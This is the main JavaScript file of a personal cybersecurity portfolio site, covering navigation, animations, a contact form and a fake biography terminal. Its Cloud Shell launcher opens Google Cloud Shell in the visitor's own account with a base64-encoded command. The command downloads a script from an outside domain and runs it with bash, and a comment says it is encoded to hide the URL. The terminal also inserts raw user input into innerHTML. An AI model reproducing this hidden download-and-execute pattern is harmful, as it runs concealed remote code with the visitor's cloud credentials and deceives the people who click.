import { generateAndOpenResumePDF } from './cv-generator.js';
import { initSpyBot } from './spybot.js';
if (typeof window !== 'undefined') window.generateAndOpenResumePDF = generateAndOpenResumePDF;

const $  = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];
const debounce = (fn, ms = 120) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };

document.addEventListener('DOMContentLoaded', () => {
  initMenu();
  initPages();
  initContactForm();
  startMatrix();
  initTerminal();
  generateFavicon();
  initScrollProgress();
  initRevealAnimations();
  initStatCounters();
  initSkillBars();
  initCloudShellLaunch();
  // Lazy-init SpyBot AI after initial paint for faster page load
  setTimeout(initSpyBot, 1500);
});

/* ══════════════════════════════════════════════════
   CLOUD SHELL SECURE LAUNCHER
══════════════════════════════════════════════════ */
function initCloudShellLaunch() {
  const btn = document.getElementById('cloud-shell-btn');
  if (!btn) return;
  btn.addEventListener('click', e => {
    e.preventDefault();
    // Execute base64 directly in the shell to hide the URL entirely from the address bar
    // Payload changed to download and run, not 'curl | bash', to preserve TTY for the generated shell
    const payload = 'Y3VybCAtc0wgaHR0cHM6Ly93d3cuYmlrYXNoa3VtYXJzYXJyYWYuY29tLm5wL3NldHVwLXRlcm1pbmFsLnNoIC1vIC90bXAvcyAmJiBiYXNoIC90bXAvcw==';
    const shellCmd = `echo ${payload} | base64 -d > /tmp/sp && bash /tmp/sp`;
    const url = `https://shell.cloud.google.com/cloudshell/open?shellcmd=${encodeURIComponent(shellCmd)}&show=terminal`;
    window.open(url, '_blank', 'noopener,noreferrer');
  });
}

function initScrollProgress() {
  const progress = document.getElementById('scroll-progress');
  if (!progress) return;
  let ticking = false;
  window.addEventListener('scroll', () => {
    if (!ticking) {
      ticking = true;
      requestAnimationFrame(() => {
        const s = document.documentElement.scrollTop;
        const h = document.documentElement.scrollHeight - document.documentElement.clientHeight;
        if (h > 0) progress.style.width = (s / h * 100) + '%';
        ticking = false;
      });
    }
  }, { passive: true });
}

/* ══════════════════════════════════════════════════
   REVEAL ANIMATIONS (Intersection Observer)
══════════════════════════════════════════════════ */
function initRevealAnimations() {
  const cards = $$('.reveal-card');
  if (!cards.length) return;

  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, {
    threshold: 0.1,
    rootMargin: '0px 0px -40px 0px'
  });

  cards.forEach(card => observer.observe(card));
}

/* trigger reveals when page switches (since pages are display:none initially) */
function triggerPageReveals(pageId) {
  const page = document.getElementById(pageId);
  if (!page) return;
  
  // Small delay for the page to become visible
  setTimeout(() => {
    const cards = page.querySelectorAll('.reveal-card');
    cards.forEach((card, i) => {
      setTimeout(() => card.classList.add('visible'), i * 80);
    });
    
    // Trigger skill bars if on skills page
    if (pageId === 'skills') {
      animateSkillBars(page);
    }
  }, 100);
}

/* ══════════════════════════════════════════════════
   STAT COUNTERS
══════════════════════════════════════════════════ */
function initStatCounters() {
  const counters = $$('.stat-number[data-target]');
  if (!counters.length) return;

  let animated = false;

  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting && !animated) {
        animated = true;
        counters.forEach(counter => animateCounter(counter));
        observer.disconnect();
      }
    });
  }, { threshold: 0.5 });

  counters.forEach(c => observer.observe(c));
}

function animateCounter(el) {
  const target = parseInt(el.dataset.target, 10);
  const duration = 1500;
  const start = performance.now();

  function tick(now) {
    const elapsed = now - start;
    const progress = Math.min(elapsed / duration, 1);
    // easeOutCubic
    const eased = 1 - Math.pow(1 - progress, 3);
    el.textContent = Math.round(target * eased);
    if (progress < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
}

/* ══════════════════════════════════════════════════
   SKILL BARS
══════════════════════════════════════════════════ */
function initSkillBars() {
  // Will be triggered on page switch
}

function animateSkillBars(container) {
  const fills = container.querySelectorAll('.skill-bar-fill[data-width]');
  fills.forEach((fill, i) => {
    setTimeout(() => {
      fill.classList.add('animated');
      fill.style.width = fill.dataset.width + '%';
    }, i * 120);
  });
}

/* ══════════════════════════════════════════════════
   HAMBURGER MENU
══════════════════════════════════════════════════ */
function initMenu() {
  const btn   = $('.hamburger');
  const panel = $('.nav-links');
  if (!btn || !panel) return;

  let overlay = $('.nav-overlay');
  if (!overlay) {
    overlay = document.createElement('div');
    overlay.className = 'nav-overlay';
    document.body.appendChild(overlay);
  }

  btn.removeAttribute('style');
  panel.removeAttribute('style');
  $$('.nav-links li, .nav-links a').forEach(el => {
    el.removeAttribute('style');
    el.style.cssText = '';
  });

  let open = false;

  function openMenu() {
    open = true;
    btn.classList.add('is-open');
    panel.classList.add('is-open');
    overlay.classList.add('is-open');
    document.body.classList.add('menu-open');
    document.body.style.overflow = 'hidden';
  }

  function closeMenu() {
    open = false;
    btn.classList.remove('is-open');
    panel.classList.remove('is-open');
    overlay.classList.remove('is-open');
    document.body.classList.remove('menu-open');
    document.body.style.overflow = '';
  }

  btn.addEventListener('click', e => {
    e.preventDefault(); e.stopPropagation();
    open ? closeMenu() : openMenu();
  });

  overlay.addEventListener('click', closeMenu);
  document.addEventListener('keydown', e => { if (e.key === 'Escape' && open) closeMenu(); });

  document.addEventListener('click', e => {
    const el = e.target.closest('[data-page]');
    if (!el) return;
    
    e.preventDefault();
    const page = el.getAttribute('data-page');
    if (page) {
      showPage(page);
    }
    if (window.innerWidth <= 992) closeMenu();
  });

  window.addEventListener('resize', debounce(() => {
    if (window.innerWidth > 992) {
      closeMenu();
      panel.removeAttribute('style');
      btn.removeAttribute('style');
    }
  }));
}

/* ══════════════════════════════════════════════════
   PAGE NAVIGATION
══════════════════════════════════════════════════ */
function initPages() {
  const hash = window.location.hash.slice(1);
  showPage(hash || 'home');

  window.addEventListener('popstate',   () => showPage(window.location.hash.slice(1) || 'home'));
  window.addEventListener('hashchange', () => showPage(window.location.hash.slice(1) || 'home'));
}

function showPage(id) {
  if (!id || !document.getElementById(id)) id = 'home';
  $$('.page').forEach(p => { p.classList.remove('active'); p.style.display = 'none'; });
  const page = document.getElementById(id);
  if (!page) return;
  page.style.display = 'block';
  page.classList.add('active');
  $$('.nav-links a').forEach(a => a.classList.toggle('active', a.getAttribute('data-page') === id));
  window.history.pushState({ id }, '', '#' + id);
  window.scrollTo(0, 0);
  
  // Trigger reveal animations for the new page
  triggerPageReveals(id);
}

/* ══════════════════════════════════════════════════
   CONTACT FORM
══════════════════════════════════════════════════ */
function initContactForm() {
  const form = $('.contact-form');
  if (!form) return;
  form.addEventListener('submit', e => {
    e.preventDefault();
    fetch(form.action, { method: form.method, body: new FormData(form), headers: { Accept: 'application/json' } })
      .then(r => { if (r.ok) { alert('Message sent!'); form.reset(); } else throw 0; })
      .catch(() => alert('Error sending message. Please try again.'));
  });
}

/* ══════════════════════════════════════════════════
   BINARY RAIN
══════════════════════════════════════════════════ */
function startMatrix() {
  const canvas = document.getElementById('binary-rain');
  if (!canvas) return;
  const ctx = canvas.getContext('2d', { alpha: false });
  const FS = 16;
  let drops = [];
  const FPS = 24; // lower fps for performance — still looks smooth
  const FRAME_MS = 1000 / FPS;
  let lastFrame = 0;

  function resize() {
    canvas.width  = window.innerWidth;
    canvas.height = window.innerHeight;
    drops = Array(Math.floor(canvas.width / FS)).fill(1);
  }
  resize();
  window.addEventListener('resize', debounce(resize));
  ctx.font = FS + 'px monospace';

  function draw(now) {
    requestAnimationFrame(draw);
    if (now - lastFrame < FRAME_MS) return;
    lastFrame = now;

    ctx.fillStyle = 'rgba(0,0,0,0.15)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#39ff14';
    const len = drops.length;
    for (let i = 0; i < len; i++) {
      ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * FS, drops[i] * FS);
      if (drops[i] * FS > canvas.height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }
  requestAnimationFrame(draw);
}

/* ══════════════════════════════════════════════════
   FAVICON
══════════════════════════════════════════════════ */
function generateFavicon() {
  try {
    const S = 64;
    const c = document.createElement('canvas');
    c.width = c.height = S;
    const x = c.getContext('2d');
    x.fillStyle = '#0b0f19'; x.fillRect(0, 0, S, S);
    const g = x.createRadialGradient(S/2,S/2,8,S/2,S/2,S/2);
    g.addColorStop(0,'#003322'); g.addColorStop(1,'#00110a');
    x.fillStyle = g; x.beginPath(); x.arc(S/2,S/2,S/2-2,0,Math.PI*2); x.fill();
    x.fillStyle='rgba(0,255,153,0.2)'; x.font='bold 10px monospace';
    for (let y=10;y<S;y+=12) for (let i=6;i<S;i+=12) x.fillText(Math.random()>.5?'1':'0',i,y);
    x.font='bold 28px Roboto Mono,monospace'; x.fillStyle='#00ff99';
    x.textAlign='center'; x.textBaseline='middle';
    x.shadowColor='#00ff99'; x.shadowBlur=8;
    x.fillText('BS', S/2, S/2+2);
    $$('link[rel="icon"]').forEach(e => e.remove());
    const lnk = document.createElement('link');
    lnk.rel='icon'; lnk.type='image/png'; lnk.href=c.toDataURL('image/png');
    document.head.appendChild(lnk);
  } catch(_) {}
}

/* ══════════════════════════════════════════════════
   TERMINAL
══════════════════════════════════════════════════ */
function initTerminal() {
  const out = document.getElementById('terminal-output');
  const inp = document.getElementById('terminal-input');
  if (!out || !inp) return;

  const CMD = {
    help:`Available commands:
- whoami         : About me
- education      : Education background
- experience     : Work experience
- projects       : My projects
- contact        : Contact info
- certifications : My certifications
- social         : Social media links
- skills         : Technical skills
- ls             : List virtual files
- cat [file]     : Read virtual files
- pwd            : Print working directory
- uname          : System information
- date           : Current date/time
- uptime         : System uptime
- history        : Command history
- neofetch       : System info display
- cv             : Download CV as PDF
- clear          : Clear the terminal`,
    whoami: "I'm Bikash Sarraf (Spydomain), a Cybersecurity & Ethical Hacking Enthusiast from Kathmandu, Nepal. Currently studying at Softwarica College of IT and E-Commerce.",
    education:`🎓 Education:
- BSc (Hons) Cybersecurity & Ethical Hacking
  Softwarica College, Kathmandu — Currently pursuing
- +2 Science (Biology) | GPA: 3.08
  Xavier International College, Kalopul — 2024
- SEE | GPA: 3.10
  Shree Sharaswasti English Boarding School, Bara — 2022`,
    experience: "💼 Currently seeking professional cybersecurity opportunities.",
    projects:`🚀 Projects:
1. Keylogger (Python) — github.com/Spydomain/keylogger
2. Bike Rental Nepal (Node+React) — github.com/Spydomain/front
3. CVE-2023-22809 Exploits — github.com/Spydomain/CVE-2023-22809-automated-python-exploits
4. ClipboardAI (Bash) — github.com/Spydomain/ClipboardAI
5. NotesVista — notesvista.netlify.app
6. NebullaComms — nebullacomms.netlify.app
7. FGE ID Platform (Flutter) — army-testgit-45113358-666ec.web.app`,
    contact:`📧 Contact:
- Email:    bikashsarraf83@gmail.com
- Location: Kathmandu, Nepal
- LinkedIn: linkedin.com/in/bikash-sarraf-683787320
- GitHub:   github.com/Spydomain`,
    social:`🌐 Social:
- LinkedIn:  linkedin.com/in/bikash-sarraf-683787320
- Instagram: instagram.com/bikash.sarraf.399
- Medium:    medium.com/@spydomain1
- HackTheBox: app.hackthebox.com/users/2178446
- TryHackMe: tryhackme.com/p/bikashsarraf`,
    skills:`💻 Technical Skills:
━━━ Languages ━━━
  HTML/CSS ████████████████░░░░ 75%
  Python   ██████████████░░░░░░ 70%
  JS/Node  █████████████░░░░░░░ 65%
  React.js ███████████░░░░░░░░░ 55%
  C        ██████████░░░░░░░░░░ 50%
  Bash     █████████████░░░░░░░ 65%
  PHP/SQL  █████████░░░░░░░░░░░ 45%

━━━ Security ━━━
  OSINT        ██████████████░░░░░░ 70%
  PenTesting   ████████████░░░░░░░░ 60%
  Web AppSec   █████████████░░░░░░░ 65%
  Network Sec  ███████████░░░░░░░░░ 55%
  Bug Bounty   █████████░░░░░░░░░░░ 45%`,
    certifications:`🎓 Certifications:
- Cisco Certified Ethical Hacker
- TryHackMe Pre-Security & Cyber Security 101
- TryHackMe Advent of Cyber 2022 / 2023 / 2024
- Certified Cybersecurity Educator Professional (CCEP)
- Google Cybersecurity Professional Certificate
- CompTIA PenTest+ (PT0-002)
- Certified API Security Analyst`,
    ls: "whoami.txt  education.txt  experience.txt  projects.txt  contact.txt  certifications.txt  social.txt  skills.txt  .secret",
    pwd: "/home/spydomain",
    uname: "SpydomainOS 6.1.0-cyber x86_64 GNU/Linux",
    hostname: "spydomain-portfolio",
    id: "uid=1337(spydomain) gid=1337(hackers) groups=1337(hackers),27(sudo)",
    uptime() {
      const hours = Math.floor(Math.random() * 72) + 1;
      const mins = Math.floor(Math.random() * 60);
      return ` ${new Date().toLocaleTimeString()} up ${hours}:${String(mins).padStart(2,'0')}, 1 user, load average: 0.42, 0.31, 0.28`;
    },
    neofetch() {
      return `       ▄▄▄▄▄▄▄▄▄▄▄       spydomain@portfolio
   ▄▀░░░░░░░░░░░░░▀▄     ─────────────────
  █░░░░░░░░░░░░░░░░░█    OS: SpydomainOS 6.1.0-cyber
 █░░░░░░░░░░░░░░░░░░░█   Host: GitHub Pages
 █░░▄▀▀▀▀▀▀▀▀▄░░░░░░░█   Kernel: web-5.15.x
 █░█  🔒  🛡️  █░░░░░░█   Uptime: Always On
 █░█         █░░░░░░░█   Shell: portfolio-sh
 █░░▀▄▄▄▄▄▄▄▀░░░░░░░░█   DE: CyberSec Theme
  █░░░░░░░░░░░░░░░░░█    Terminal: xterm-256color
   ▀▄░░░░░░░░░░░░░▀▄     Resolution: ∞ × ∞
     ▀▀▀▀▀▀▀▀▀▀▀▀▀       CPU: Neural Engine v3
                          Memory: 1337MB / ∞MB`;
    },
    cat(args) {
      if (!args) return "Usage: cat [filename]";
      if (args === '.secret') return "🔐 Nice try! But the secrets are encrypted. Try harder! 😎";
      const f = args.toLowerCase().replace('.txt','');
      const alias = { 'about':'whoami', 'me':'whoami' };
      const key = alias[f] || f;
      if (key in CMD && typeof CMD[key] === 'string') return CMD[key];
      if (key in CMD && typeof CMD[key] === 'function') return CMD[key]();
      return `cat: ${args}: No such file or directory`;
    },
    date()  { return new Date().toString(); },
    echo(a) { return a || ''; },
    cv()    { 
      enq('Generating PDF and opening CV...'); 
      setTimeout(() => generateAndOpenResumePDF(), 800); 
      return ''; 
    },
    clear() { out.innerHTML = ''; return ''; },
  };

  // Command history
  const cmdHistory = [];
  let historyIdx = -1;

  let q = Promise.resolve();
  const type = (text, cls='command-output') => new Promise(res => {
    const d = document.createElement('div');
    d.className = cls; out.appendChild(d);
    let i = 0;
    const termWrap = document.getElementById('terminal');
    const tick = () => {
      if (i < text.length) {
        d.textContent += text[i++];
        if (termWrap) termWrap.scrollTop = termWrap.scrollHeight;
        out.scrollTop = out.scrollHeight;
        setTimeout(tick, 5);
      } else {
        if (termWrap) termWrap.scrollTop = termWrap.scrollHeight;
        out.scrollTop = out.scrollHeight;
        res();
      }
    };
    tick();
  });
  const enq = (t, c) => { q = q.then(() => type(t, c)); };

  enq("Welcome to Spydomain's Portfolio Terminal\nType 'help' to see available commands\n\n", 'welcome-message');

  inp.addEventListener('keydown', e => {
    // Tab completion
    if (e.key === 'Tab') {
      e.preventDefault();
      const val = inp.value.trim();
      if (!val) return;
      const parts = val.split(' ');
      const cmds = Object.keys(CMD);
      const files = ["whoami.txt", "education.txt", "experience.txt", "projects.txt", "contact.txt", "certifications.txt", "social.txt", "skills.txt", ".secret"];
      
      let matches = [];
      if (parts.length === 1) {
        matches = cmds.filter(c => c.startsWith(parts[0].toLowerCase()));
      } else if (parts[0].toLowerCase() === 'cat') {
        matches = files.filter(f => f.startsWith(parts[1].toLowerCase()));
      }

      if (matches.length === 1) {
        inp.value = (parts.length === 1) ? matches[0] + ' ' : parts[0] + ' ' + matches[0];
      }
    }

    // Arrow up/down for history
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (cmdHistory.length > 0 && historyIdx < cmdHistory.length - 1) {
        historyIdx++;
        inp.value = cmdHistory[cmdHistory.length - 1 - historyIdx];
      }
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIdx > 0) {
        historyIdx--;
        inp.value = cmdHistory[cmdHistory.length - 1 - historyIdx];
      } else {
        historyIdx = -1;
        inp.value = '';
      }
      return;
    }

    if (e.key !== 'Enter') return;
    e.preventDefault();
    const cmd = inp.value.trim();
    if (!cmd) return;

    // Add to history
    cmdHistory.push(cmd);
    historyIdx = -1;

    const ln = document.createElement('div');
    ln.className = 'command-line';
    ln.innerHTML = `<span class="prompt">Bikash@Spydomain#</span> ${cmd}`;
    out.appendChild(ln);
    const parts = cmd.split(' ');
    const k = parts[0].toLowerCase();
    const args = parts.slice(1).join(' ');

    // Special command: history
    if (k === 'history') {
      const histStr = cmdHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');
      enq(histStr);
    } else if (k in CMD) {
      const r = typeof CMD[k] === 'function' ? CMD[k](args) : CMD[k];
      if (r) enq(r);
    } else {
      enq(`Command not found: ${cmd}\nType 'help' for available commands`, 'error-message');
    }
    inp.value = '';
    const termWrap = document.getElementById('terminal');
    if (termWrap) termWrap.scrollTop = termWrap.scrollHeight;
    out.scrollTop = out.scrollHeight;
  });

  document.addEventListener('click', e => {
    if (e.target.closest('#terminal') || e.target.closest('#terminal-output')) {
      inp.focus();
    }
  });
  setTimeout(() => inp.focus(), 500);
}
